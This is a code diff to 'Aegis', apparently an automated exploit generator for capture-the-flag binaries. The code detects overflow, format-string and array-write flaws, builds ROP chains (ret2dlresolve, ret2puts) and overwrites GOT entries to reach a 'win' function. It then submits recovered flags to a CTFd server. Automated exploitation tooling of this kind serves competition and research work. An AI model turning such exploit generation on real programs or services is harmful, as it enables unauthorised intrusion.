@@ -6,7 +6,6 @@ import json
 import requests
 
 from pwn import *
-from time import *
 from multiprocessing import *
 
 from rage.rage import rAEG
@@ -19,12 +18,10 @@ class Aegis:
     """Class that does the control flow for analysis and execution."""
 
     def __init__(self, binary, libc, ip, port, ctfd, flag_format, id):
-    
         self.binary = os.path.abspath(binary)
         self.binary_name = binary.split("/")[-1]
         self.elf = ELF(self.binary)
         self.rop = ROP(self.elf)
-        
 
         self.libc = ELF(libc) if libc != None else self.elf.libc
 
@@ -33,7 +30,6 @@ class Aegis:
         self.ctfd = ctfd
         self.chal_id = id
         self.flag_format = flag_format if flag_format is not None else b"flag"
-
 
         self.access_token = os.environ.get("CTFD_TOK")
         self.headers = {
@@ -54,7 +50,6 @@ class Aegis:
         self.array_write = (None, None)
         self.got_targets = None
 
-
     def static_analysis(self):
         self.machine.check_mitigations()
         self.machine.check_vulnerable_input()
@@ -67,7 +62,6 @@ class Aegis:
         else:
             self.got_targets = self.machine.get_got_functions("vuln")
 
-
     def symbolic_analysis(self):
         if self.array_write == (None, None) or self.array_write == None:
             self.symbol.stack_smash()
@@ -75,7 +69,6 @@ class Aegis:
         
             if self.has_format == False:
                 self.has_format = self.symbol.has_format 
-
 
     def setup_exploit(self):
         
@@ -126,58 +119,24 @@ class Aegis:
                         aegis_log.info(f"[{self.binary_name}] Found remote flag through stack leak: {self.against.remote_flag}")
                         self.send_flag(self.against.remote_flag)
             else:
+
                 if self.got_targets != None:
                     got_addr = self.elf.got[self.got_targets[-1]]
                 else:
                     got_addr = self.elf.got["printf"]
+                
                 if self.array_write != (None, None):
-                    got_section = self.machine.sections[".got.plt"]
-                    index = (got_addr - self.array_write[0]) // self.array_write[1]
-                    rem = (got_addr - self.array_write[0]) % self.array_write[1] 
 
-                    start_addr = self.array_write[0] + index * self.array_write[1]
-                    end_addr = start_addr + self.array_write[1]
-                    
-                    if start_addr < got_section.start+0x18 or end_addr > got_section.end:
-
-                        got_addr = self.elf.got["printf"]
-                        index = (got_addr - self.array_write[0]) // self.array_write[1]
-                        rem = (got_addr - self.array_write[0]) % self.array_write[1] 
-                        start_addr = self.array_write[0] + index * self.array_write[1]
-                        end_addr = start_addr + self.array_write[1]
- 
-                        aegis_log.warning(f"Writing out of bounds of got section")
-
-
-                    aegis_log.debug(f"[{self.binary_name}] Writing to {hex(got_addr)} with index {index} and {rem}\nStart of write {hex(start_addr)}, End of write {hex(end_addr)}")
-
-                    system_plt = self.elf.plt["system"] + 0x6
-                    system_got = self.elf.got["system"]
-                    addr = start_addr
-                    edit = b"" 
-                    size = self.array_write[1]
-                    while rem > 0:
-                        if rem == 0:
-                            check = self.elf.sym["win"] & 0xff
-                            if check == 0xa:
-                                edit += p64(self.elf.sym["win"]+1)
-                            else:
-                                edit += p64(self.elf.sym["win"])
-                        elif addr == system_got:
-                            edit += p64(system_plt)
-                        else:
-                            edit += b"A" * 8
-                        rem -= 8
-                        addr += 8
-
-                    check = self.elf.sym["win"] & 0xff
-                    if check == 0xa:
-                        edit += p64(self.elf.sym["win"]+1)
-                    else:
-                        edit += p64(self.elf.sym["win"])
-
-                    self.against.array_exploit = [index, edit]
+                    aegis_log.debug(f"Writing to {self.got_targets[-1]}")
+                    self.against.array_write(self.array_write, got_addr)
                     self.exploit()
+                    bad_entries = ["__gmon_start__", "stdin", "stdout", "stderr", "system"]                    
+                    if self.against.remote_flag == None or self.against.flag == None:
+                        for got_entry in self.elf.got.keys():
+                            if got_entry in bad_entries:
+                                continue
+                            self.against.array_write(self.array_write, self.elf.got[got_entry])
+                            self.exploit()
 
         # Stack Based Buffer Overflow ROP
         else: 
@@ -225,7 +184,14 @@ class Aegis:
                     aegis_log.debug(f"[{self.binary_name}] Setting up return to dlresolve")
                     self.against.chain = self.against.rop_chain_dlresolve()
             self.exploit()
-            
+            if self.against.remote_flag == None:
+                if len(self.machine.find_functions(["puts","printf"])) > 0 and self.machine.find_reg_gadget("rdi") != None:
+                    aegis_log.debug(f"[{self.binary_name}] Setting up return to puts")
+                    self.against.chain = self.against.rop_ret2puts()
+                
+                self.exploit()
+
+
 
     def write_solve_script(self):
         """Write the solve to a script for writeup purposes."""
@@ -237,7 +203,6 @@ class Aegis:
             return 
         
         challenge_url = f"{self.ctfd}/api/v1/challenges/attempt"
-        print(challenge_url)
         data = json.dumps({"challenge_id" : self.chal_id, "submission" : flag})
 
         response = requests.post(challenge_url, headers=self.headers, data=data)
@@ -265,7 +230,7 @@ class Aegis:
             if self.against.format_exploit != None:
                 aegis_log.debug(f"[{self.binary_name}] Sending format string payload {self.against.format_exploit} {format_len % 16}")
 
-        option = "GDB" if args.GDB else ""
+        option = "GDB" if args.GDB else "" 
 
         self.against.process = self.against.start(option)
         self.against.send_exploit()
@@ -366,7 +331,8 @@ def exploit_binary(binary, libc, ip, port, ctfd, id):
     aeg.setup_exploit()
 
     if aeg.against.flag != None:
-        potfile = open(".potfile", "a")
+        potfile = open("bininfo/.potfile", "a")
+        
 
         string = aeg.binary_name + " " +  aeg.against.flag 
         if aeg.against.remote_flag != None:
@@ -376,7 +342,7 @@ def exploit_binary(binary, libc, ip, port, ctfd, id):
         potfile.write(string)
         potfile.close()
     else:
-        missing = open(".missing", "a")
+        missing = open("bininfo/.missing", "a")
         missing.write(aeg.binary_name + "\n")
         missing.close()
 
@@ -388,12 +354,9 @@ def exploit_binary(binary, libc, ip, port, ctfd, id):
 
 if __name__ == "__main__":
     logging.getLogger("angr").setLevel(logging.CRITICAL)
-    #logging.getLogger("angr").setLevel(logging.DEBUG)
     logging.getLogger("os").setLevel(logging.CRITICAL)
     logging.getLogger("pwnlib").setLevel(logging.CRITICAL)
     logging.getLogger("aegis_log").setLevel(logging.DEBUG)
-    #logging.getLogger("aegis_log").setLevel(logging.CRITICAL)
-    #logging.getLogger("aegis_log").setLevel(logging.ERROR)
 
     parser = argparse.ArgumentParser( 
         prog = "Aegis", 
@@ -418,7 +381,6 @@ if __name__ == "__main__":
     solved = []
 
     if arguments.batch:
-
         if os.path.isdir(arguments.batch) == False:
             challenges = open(arguments.batch, "r").readlines()
             for chal in challenges:
@@ -426,7 +388,6 @@ if __name__ == "__main__":
                 service = chal[0]
                 bin = chal[1]
                 id = chal[2]
-            
                 if arguments.thread:
                     proc = Process(target=exploit_binary, args=(bin,"./libc/libc.so.6",service,None,"https://ace.ctfd.io",id))            
                     proc.start()
@@ -437,13 +398,10 @@ if __name__ == "__main__":
                 file = arguments.batch + chal
                 if ".git" in file or ".sh" in file or ".py" in file:
                     continue
-
                 if arguments.thread:
                     proc = Process(target=exploit_binary, args=(file,"./libc/libc.so.6",None,None,None,None))            
                     proc.start()
                 else:
                     exploit_binary(file,"./libc/libc.so.6",None,None,None,None)
-
-
     else:
         exploit_binary(arguments.bin, arguments.libc, arguments.ip, arguments.port, arguments.ctfd, arguments.id)
